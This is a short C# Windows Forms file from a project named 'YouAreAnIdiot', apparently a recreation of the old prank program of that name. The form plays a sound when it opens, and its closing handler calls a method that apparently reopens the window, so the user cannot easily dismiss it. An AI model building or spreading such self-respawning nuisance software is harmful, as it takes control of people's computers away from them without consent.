namespace YouAreAnIdiot
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Program.PlaySound();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Program.OpenItself();
        }
    }
}
